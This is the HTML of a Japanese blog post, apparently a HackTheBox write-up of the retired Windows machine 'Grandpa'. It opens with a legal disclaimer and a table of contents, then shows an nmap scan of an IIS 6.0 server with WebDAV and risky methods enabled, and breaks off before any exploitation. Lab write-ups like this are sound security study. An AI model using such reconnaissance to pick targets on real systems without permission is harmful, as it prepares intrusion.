<!DOCTYPE html><html lang="ja"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/styles.e71379dda153709d1a9a.css" id="gatsby-global-css">html{font-size:100}body{margin:0 0 0 calc(100vw - 100%);color:#222;line-height:1.4;font-size:.875rem;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background-color:#fcfcfc}body,h1,h2,h3,h4,h5,h6{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif}h1,h2,h3,h4,h5,h6{font-weight:600}h1{font-size:1.575rem;line-height:2.25rem;margin-top:5rem;margin-bottom:1.25rem}h2{font-size:1.47656rem;line-height:1.875rem}h2,h3{margin-top:2.5rem;margin-bottom:.625rem}h3{font-size:1.20313rem;line-height:1.25rem}h4{font-size:1.05rem;margin-top:1.875rem}h4,h5{line-height:1.25rem;margin-bottom:.625rem}h5,h6{font-size:.875rem;margin-top:3.125rem}h6{line-height:1.25rem;margin-bottom:.625rem}img{max-width:100%;margin:inherit auto}hr,img{border:0;display:block}hr{color:#222;height:1.625rem;margin:3.25rem auto;background-size:100% 26px;background-image:linear-gradient(180deg,transparent 1px,transparent 11px,#222 0,#222 15px,transparent 0,transparent 26px);width:6.25rem}a{color:#918d40;text-decoration:none}a:active,a:focus,a:hover{color:#a9d159}b,strong{font-weight:600}ul{list-style:square;margin-bottom:1.25rem}ul li{padding:0 .3125rem;margin-bottom:.625rem}p{line-height:1.25rem;margin-bottom:1.25rem}blockquote{font-style:italic;text-align:center;background-color:#f5f5f5;padding:.1875rem .625rem}figure{display:block;width:100%;height:auto}figcaption{line-height:.9375rem;margin-top:.3125rem;color:#222;font-size:.75rem;font-style:italic;margin-bottom:0;text-align:center}.anchor{margin-left:-1.875rem!important;padding-right:.875rem!important}@media screen and (min-width:685px){figure.float-left,figure.float-right{max-width:19.375rem;padding:0 1.25rem}.float-right{float:right}.float-left{float:left}}code[class*=language-],pre[class*=language-]{color:#ccc;background:0 0;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#999}.token.punctuation{color:#ccc}.token.attr-name,.token.deleted,.token.namespace,.token.tag{color:#e2777a}.token.function-name{color:#6196cc}.token.boolean,.token.function,.token.number{color:#f08d49}.token.class-name,.token.constant,.token.property,.token.symbol{color:#f8c555}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector{color:#cc99cd}.token.attr-value,.token.char,.token.regex,.token.string,.token.variable{color:#7ec699}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}li>code[class*=language-text],p>code[class*=language-text]{background:#f9f9f9!important;color:#2d2d2d!important}.Author-module--author__photo--36xCH{display:inline-block;margin-bottom:0;border-radius:50%;background-clip:padding-box}.Author-module--author__title--2CaTb{font-size:.98438rem;font-weight:600;line-height:1.40625rem;margin:.625rem 0}.Author-module--author__title-link--Yrism,.Author-module--author__title-link--Yrism:focus,.Author-module--author__title-link--Yrism:hover{color:#222}.Author-module--author__subtitle--cAaEB{color:#888;line-height:1.25rem;margin-bottom:1.25rem}.Icon-module--icon--Gpyvw{display:inline-block;width:1em;height:1em;stroke-width:0;stroke:currentColor;fill:currentColor;font-style:normal;font-weight:400;speak:none;margin-right:.2em;text-align:center;font-variant:normal;text-transform:none;line-height:1em;margin-left:.2em;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.Contacts-module--contacts--1rGd1{margin-bottom:1.25rem}.Contacts-module--contacts__list--3OgdW{display:flex;flex-flow:row wrap;flex-grow:0;flex-shrink:0;list-style:none;padding:0;margin:.625rem -.1875rem;width:8.75rem}.Contacts-module--contacts__list-item--16p9q{padding:0;margin:.25rem;display:flex;align-content:center;align-items:center;justify-content:center;height:2.1875rem;width:2.1875rem;line-height:2.1875rem;border-radius:50%;text-align:center;border:1px solid #ebebeb}.Contacts-module--contacts__list-item-link--2MIDn{border:0;display:flex;color:#222}.Contacts-module--contacts__list-item-link--2MIDn:focus,.Contacts-module--contacts__list-item-link--2MIDn:hover{color:#918d40}.Copyright-module--copyright--1ariN{color:#b6b6b6;font-size:.75rem}.Menu-module--menu--Efbin{margin-bottom:1.25rem}.Menu-module--menu__list--31Zeo{list-style:none;padding:0;margin:0}.Menu-module--menu__list-item--1lJ6B{padding:0;margin:.625rem 0}.Menu-module--menu__list-item-link--10Ush{font-size:.875rem;color:#222;font-weight:400;border:0}.Menu-module--menu__list-item-link--10Ush:focus,.Menu-module--menu__list-item-link--10Ush:hover{color:#918d40;border-bottom:1px solid #918d40}.Menu-module--menu__list-item-link--active--2CbUO{color:#222;border-bottom:1px solid #222}.Sidebar-module--sidebar--X4z2p{width:100%}.Sidebar-module--sidebar__inner--Jdc5s{position:relative;padding:1.5625rem 1.25rem 0}.Sidebar-module--headerimage--19Rdy{width:100%;min-height:70px;max-height:120px;margin:0 0 .625rem}.Sidebar-module--logo-image--XDYae{min-height:70px;max-height:120px;margin:0 auto}input{-webkit-appearance:none;-moz-appearance:none;appearance:none;padding:.625rem;margin:.3125rem 0;border:1px solid #999;border-radius:.3125rem}.Sidebar-module--search-container--17C6F{position:relative}.Sidebar-module--search-container-input--27Tw4{width:100%}.Sidebar-module--search-container-submit--WwtLg{position:absolute;width:2.375rem;height:2.375rem;top:calc(50% - 19px);right:0;border:3px solid #999;border-radius:0 .25rem .25rem 0;background:#999}.Sidebar-module--search-container-submit--WwtLg:before{position:absolute;content:"";width:.9375rem;height:.9375rem;top:calc(50% - 9px);left:calc(50% - 9px);border-radius:50%;box-shadow:0 0 0 2px #fff}.Sidebar-module--search-container-submit--WwtLg:after{position:absolute;content:"";width:.5rem;height:.375rem;top:calc(50% + 6px);left:calc(50% + 2px);border-top:2px solid #fff;transform:rotate(45deg)}@media screen and (min-width:685px){.Sidebar-module--sidebar--X4z2p{width:calc(41.625% - 1.09375rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(12n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(12n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:1.875rem 1.25rem 0}.Sidebar-module--sidebar__inner--Jdc5s:after{background:#e6e6e6;background:linear-gradient(180deg,#e6e6e6 0,#e6e6e6 48%,#fff);position:absolute;content:"";width:.0625rem;height:33.75rem;top:30px;right:-10px;bottom:0}}@media screen and (min-width:960px){.Sidebar-module--sidebar--X4z2p{width:calc(33.3% - 1.25rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(3n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(3n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:2.5rem}}.Layout-module--layout--3Pyz6{max-width:66.875rem;margin-left:auto;margin-right:auto}.Layout-module--layout--3Pyz6:before{content:"";display:table}.Layout-module--layout--3Pyz6:after{content:"";display:table;clear:both}.Feed-module--feed__item--2D5rE{margin-bottom:1.5625rem}.Feed-module--feed__item--2D5rE:last-child{margin-bottom:.625rem}.Feed-module--feed__item-title--3nigr{font-size:1.47656rem;line-height:1.875rem;margin-top:0;margin-bottom:.625rem}.Feed-module--feed__item-title-link--iFMRs{color:#222}.Feed-module--feed__item-title-link--iFMRs:focus,.Feed-module--feed__item-title-link--iFMRs:hover{color:#222;border-bottom:1px solid #222}.Feed-module--feed__item-description--1uO8e{font-size:.875rem;line-height:1.25rem;margin-bottom:.9375rem}.Feed-module--feed__item-meta-time--3t1fg{font-size:.75rem;color:#222;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-divider--N-Q0A{margin:0 .3125rem}.Feed-module--feed__item-meta-category-link--23f8F{font-size:.75rem;color:#a9d159;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-category-link--23f8F:focus,.Feed-module--feed__item-meta-category-link--23f8F:hover{color:#918d40}.Feed-module--feed__item-readmore--1u6bI{font-size:.875rem;color:#918d40}.Feed-module--feed__item-readmore--1u6bI:focus,.Feed-module--feed__item-readmore--1u6bI:hover{color:#918d40;border-bottom:1px solid #918d40}.Page-module--page--2nMky{margin-bottom:2.5rem}.Page-module--page__inner--2M_vz{padding:1.5625rem 1.25rem}.Page-module--page__title--GPD8L{font-size:1.575rem;font-weight:600;line-height:2.5rem;margin-top:0;margin-bottom:1.8125rem}.Page-module--page__body--Ic6i6{font-size:.875rem;line-height:1.25rem;margin:0 0 1.25rem}@media screen and (min-width:685px){.Page-module--page--2nMky{width:calc(58.275% - .78125rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(12n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(12n+1){clear:both}.Page-module--page__inner--2M_vz{padding:1.875rem 1.25rem}}@media screen and (min-width:960px){.Page-module--page--2nMky{width:calc(66.6% - .625rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(3n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(3n+1){clear:both}.Page-module--page__inner--2M_vz{padding:2.5rem 2.1875rem}}.Pagination-module--pagination--2H3nO{margin-top:2.5rem;display:flex}.Pagination-module--pagination__prev--bet5s{width:50%;text-align:left}.Pagination-module--pagination__prev-link--1Nzs6{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__prev-link--1Nzs6:focus,.Pagination-module--pagination__prev-link--1Nzs6:hover{color:#918d40}.Pagination-module--pagination__prev-link--disable--Yklx9{pointer-events:none;color:#bbb}.Pagination-module--pagination__next--3hFiN{width:50%;text-align:right}.Pagination-module--pagination__next-link--3FUtA{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__next-link--3FUtA:focus,.Pagination-module--pagination__next-link--3FUtA:hover{color:#918d40}.Pagination-module--pagination__next-link--disable--30UwZ{pointer-events:none;color:#bbb}.Author-module--author--2Yefr{border-top:1px solid #e6e6e6;max-width:43.75rem;padding-top:1.25rem;line-height:1.25rem;margin-top:1.25rem;margin-bottom:2.5rem}.Author-module--author__bio-twitter--n-O9n{display:block;text-decoration:underline}@media screen and (min-width:685px){.Author-module--author--2Yefr{margin-left:auto;margin-right:auto}}.Content-module--content--3p512{max-width:62.8125rem;padding:0 .9375rem;margin:0 auto}.Content-module--content__title--2BDW9{font-size:1.75rem;max-width:43.75rem;font-weight:600;text-align:center;line-height:2.0625rem;margin:1.25rem auto 0}.Content-module--content__body--2TrQ- figure{margin-bottom:1.25rem}.Content-module--content__body--2TrQ- figure blockquote{font-style:italic;text-align:center;margin-top:0;padding:1.25rem 0}.Content-module--content__body--2TrQ- figure blockquote p{max-width:43.75rem;font-size:1.47149rem;margin-top:1.25rem;margin-bottom:1.25rem;line-height:1.875rem}.Content-module--content__body--2TrQ- a{text-decoration:underline}.Content-module--content__body--2TrQ- *{max-width:43.75rem;margin-left:auto;margin-right:auto}.Content-module--content__body--2TrQ- img{max-width:100%;margin-top:.625rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- li ul{margin-bottom:.625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- h2{position:relative;padding:1rem 1.5rem;color:#fff;border-radius:.625rem;background:#0c0000}.Content-module--content__body--2TrQ- h2:after{position:absolute;bottom:-9px;left:1rem;width:0;height:0;content:"";border-color:#0c0000 transparent transparent;border-style:solid;border-width:10px 10px 0}.Content-module--content__body--2TrQ- h3{border-bottom:3px dotted #0c0000;padding:1rem 0}@media screen and (min-width:960px){.Content-module--content--3p512{padding:0}.Content-module--content__title--2BDW9{font-size:1.75rem;line-height:2.8125rem;margin-top:2.8125rem;margin-bottom:1.875rem}.Content-module--content__body--2TrQ-,.Content-module--content__body--2TrQ- p{font-size:.98438rem;line-height:1.40625rem;margin-bottom:1.40625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}}.Meta-module--meta__date--29eD7{font-style:italic}.Tags-module--tags--1L_ct{margin-bottom:.625rem}.Tags-module--tags__list--91FqN{list-style:none;margin:0 -.625rem;padding:0}.Tags-module--tags__list-item--1M30P{display:inline-block;margin:.625rem .3125rem}.Tags-module--tags__list-item-link--3SL_8{display:inline-block;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;border:1px solid #e6e6e6;text-decoration:none;border-radius:1.25rem;color:#222}.Tags-module--tags__list-item-link--3SL_8:focus,.Tags-module--tags__list-item-link--3SL_8:hover{color:#918d40}.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{max-width:43.75rem;margin:0 auto;padding:0 .9375rem}.Post-module--post__home-button--16Kl0{display:block;max-width:5.625rem;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;text-align:center;color:#222;border:1px solid #e6e6e6;border-radius:1.25rem;font-size:.875rem;font-weight:400;margin-left:auto;margin-right:auto;margin-top:1.25rem}.Post-module--post__home-button--16Kl0:focus,.Post-module--post__home-button--16Kl0:hover{color:#918d40}@media screen and (min-width:960px){.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{padding:0}.Post-module--post__home-button--16Kl0{position:fixed;max-width:auto;margin:0;top:30px;left:30px}}</style><meta name="generator" content="Gatsby 2.32.13"/><link rel="alternate" type="application/rss+xml" title="かえるのひみつきち" href="/rss.xml"/><style type="text/css">
    .anchor.before {
      position: absolute;
      top: 0;
      left: 0;
      transform: translateX(-100%);
      padding-right: 4px;
    }
    .anchor.after {
      display: inline-block;
      padding-left: 4px;
    }
    h1 .anchor svg,
    h2 .anchor svg,
    h3 .anchor svg,
    h4 .anchor svg,
    h5 .anchor svg,
    h6 .anchor svg {
      visibility: hidden;
    }
    h1:hover .anchor svg,
    h2:hover .anchor svg,
    h3:hover .anchor svg,
    h4:hover .anchor svg,
    h5:hover .anchor svg,
    h6:hover .anchor svg,
    h1 .anchor:focus svg,
    h2 .anchor:focus svg,
    h3 .anchor:focus svg,
    h4 .anchor:focus svg,
    h5 .anchor:focus svg,
    h6 .anchor:focus svg {
      visibility: visible;
    }
  </style><script>
    document.addEventListener("DOMContentLoaded", function(event) {
      var hash = window.decodeURI(location.hash.replace('#', ''))
      if (hash !== '') {
        var element = document.getElementById(hash)
        if (element) {
          var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
          var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
          var offset = element.getBoundingClientRect().top + scrollTop - clientTop
          // Wait for the browser to finish rendering before scrolling.
          setTimeout((function() {
            window.scrollTo(0, offset - 0)
          }), 0)
        }
      }
    })
  </script><link rel="preconnect dns-prefetch" href="https://www.google-analytics.com"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-122086587-6"></script><script>
      
      
      if(true) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){window.dataLayer && window.dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-122086587-6', {"send_page_view":false});
      }
      </script><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="icon" href="/favicon-32x32.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><meta name="theme-color" content="#F7A046"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><title data-react-helmet="true">【Easy/Windows】Grandpa Writeup(HackTheBox) - かえるのひみつきち</title><meta data-react-helmet="true" name="description" content="HackTheBoxのリタイアマシン「Grandpa」のWriteUpです。"/><meta data-react-helmet="true" property="og:site_name" content="【Easy/Windows】Grandpa Writeup(HackTheBox) - かえるのひみつきち"/><meta data-react-helmet="true" property="og:image" content="https://kashiwaba-yuki.com/static/65e0040c358d6e6aac91d33a338c1b69/hackthebox-windows-grandpa.png"/><meta data-react-helmet="true" name="twitter:card" content="summary"/><meta data-react-helmet="true" name="twitter:title" content="【Easy/Windows】Grandpa Writeup(HackTheBox) - かえるのひみつきち"/><meta data-react-helmet="true" name="twitter:description" content="HackTheBoxのリタイアマシン「Grandpa」のWriteUpです。"/><meta data-react-helmet="true" name="twitter:image" content="https://kashiwaba-yuki.com/static/65e0040c358d6e6aac91d33a338c1b69/hackthebox-windows-grandpa.png"/><link as="script" rel="preload" href="/webpack-runtime-23b45a0eb82da62a4c67.js"/><link as="script" rel="preload" href="/framework-3761df4ab6ee9f056936.js"/><link as="script" rel="preload" href="/532a2f07-92db97c0addf07d5cb73.js"/><link as="script" rel="preload" href="/dc6a8720040df98778fe970bf6c000a41750d3ae-f8d9f189f54b1dfba1bf.js"/><link as="script" rel="preload" href="/app-a40552d3997721f1a522.js"/><link as="script" rel="preload" href="/styles-407fe62976dc5310c43e.js"/><link as="script" rel="preload" href="/cd95ea5cbd2c605f26db819f07999610c9ff4310-9bf27003829f242941c6.js"/><link as="script" rel="preload" href="/component---src-templates-post-template-js-381c1b847824134fa4bd.js"/><link as="fetch" rel="preload" href="/page-data/hackthebox-windows-grandpa/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/251939775.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/401334301.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/825871152.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="Layout-module--layout--3Pyz6"><div><a class="Post-module--post__home-button--16Kl0" href="/">All Articles</a><div><div class="Content-module--content--3p512"><h1 class="Content-module--content__title--2BDW9">【Easy/Windows】Grandpa Writeup(HackTheBox)</h1><div class="Content-module--content__body--2TrQ-"><p>「Hack The Box」という、ペネトレーションテストの学習プラットフォームを利用してセキュリティについて学んでいます。
「Hack The Box」のランクは、本記事執筆時点でProHackerです。</p>
<span class="gatsby-resp-image-wrapper" style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 220px; ">
      <a class="gatsby-resp-image-link" href="/static/598fc82bb08f81fbaaa4aab930820dd3/c8042/327080.png" style="display: block" target="_blank" rel="noopener">
    <span class="gatsby-resp-image-background-image" style="padding-bottom: 22.727272727272727%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABX0lEQVQY0x2PTW8SURiF51+4d6MbTcuAhbnzcYeZAQb5aJiGaR0+RALRSKCh1lTa0tq6c6WLpqumSxO3bvwJ/qn7eGFxcnLenDw5r3G9OuHL6VxdrRZ0D1PqnZRGkrKfZiRvBmSjib51scMaftxkzwu1t3SOcaK6VkzBKWMKqbQwfj9eqj+/vvPv7wNf10tGH+Ycfz5jOlswW55ytr6mP57i19sk2WAL7xz1GIwnpP0R2bspRRltgOTtQBnrmxY/fq7U/d0t39afaHXf6lXvkdU2btjSsI/4UZN8O8OMOuzKBk5Y5mRoY0uPKHTZKfmYlqN2iiZGO32qxrOYi/Mh49EBQeLSOAqpHHjUDgXNXplg38OqSMJEQ2KPvCgjpK9f9dlzpV4XsGuZhN0nyniRe6YLz5UrX+mCg6gKRM1CVGzcusCJLeyaTSlwcF8L7S45yycn9KqtNq/qXHLUy4LJf3H/wNmxBWKzAAAAAElFTkSuQmCC'); background-size: cover; display: block;"></span>
  <picture>
          <source srcset="/static/598fc82bb08f81fbaaa4aab930820dd3/b5458/327080.webp 220w" sizes="(max-width: 220px) 100vw, 220px" type="image/webp">
          <source srcset="/static/598fc82bb08f81fbaaa4aab930820dd3/c8042/327080.png 220w" sizes="(max-width: 220px) 100vw, 220px" type="image/png">
          <img class="gatsby-resp-image-image" src="/static/598fc82bb08f81fbaaa4aab930820dd3/c8042/327080.png" alt="Hack The Box" title="Hack The Box" loading="lazy" style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;">
        </picture>
  </a>
    </span>
<p>今回は、HackTheBoxのリタイアマシン「Grandpa」のWriteUpです。</p>
<!-- omit in toc -->
<h2 id="本記事について" style="position:relative;"><a href="#%E6%9C%AC%E8%A8%98%E4%BA%8B%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6" aria-label="本記事について permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>本記事について</h2>
<p><strong>本記事の内容は社会秩序に反する行為を推奨することを目的としたものではございません。</strong></p>
<p>自身の所有する環境、もしくは許可された環境以外への攻撃の試行は、「不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）」に違反する可能性があること、予めご留意ください。</p>
<p>またすべての発言は所属団体ではなく個人に帰属します。</p>
<!-- omit in toc -->
<h2 id="もくじ" style="position:relative;"><a href="#%E3%82%82%E3%81%8F%E3%81%98" aria-label="もくじ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>もくじ</h2>
<ul>
<li>
<p><a href="#%E6%8E%A2%E7%B4%A2">探索</a></p>
<ul>
<li><a href="#%E3%83%9D%E3%83%BC%E3%83%88%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3">ポートスキャン</a></li>
<li><a href="#wevdav%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3">WevDAVのスキャン</a></li>
<li><a href="#%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88">エクスプロイト</a></li>
</ul>
</li>
<li><a href="#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2">内部探索</a></li>
<li><a href="#%E3%81%BE%E3%81%A8%E3%82%81">まとめ</a></li>
</ul>
<h2 id="探索" style="position:relative;"><a href="#%E6%8E%A2%E7%B4%A2" aria-label="探索 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>探索</h2>
<h3 id="ポートスキャン" style="position:relative;"><a href="#%E3%83%9D%E3%83%BC%E3%83%88%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3" aria-label="ポートスキャン permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ポートスキャン</h3>
<p>とりあえずNmapを叩いていきます。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ nmap -sV -sC -T4 <span class="token variable">$RHOST</span><span class="token operator">|</span> <span class="token function">tee</span> nmap1.txt
PORT   STATE SERVICE VERSION
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Microsoft IIS httpd <span class="token number">6.0</span>
<span class="token operator">|</span> http-methods: 
<span class="token operator">|</span>_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
<span class="token operator">|</span>_http-title: Under Construction
<span class="token operator">|</span> http-webdav-scan: 
<span class="token operator">|</span>   Server Date: Sat, 04 Jun <span class="token number">2022</span> 01:01:45 GMT
<span class="token operator">|</span>   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
<span class="token operator">|</span>   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
<span class="token operator">|</span>   WebDAV type: Unknown
<span class="token operator">|</span>_  Server Type: Microsoft-IIS/6.0
<span class="token operator">|</span>_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">28.16</span> seconds</code></pre></div>
<p>IISが稼働しているようなのでアクセスしてみました。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 612px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/b2533fe676689a33affdb40498991d33/8c76f/image-20220604100328237.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
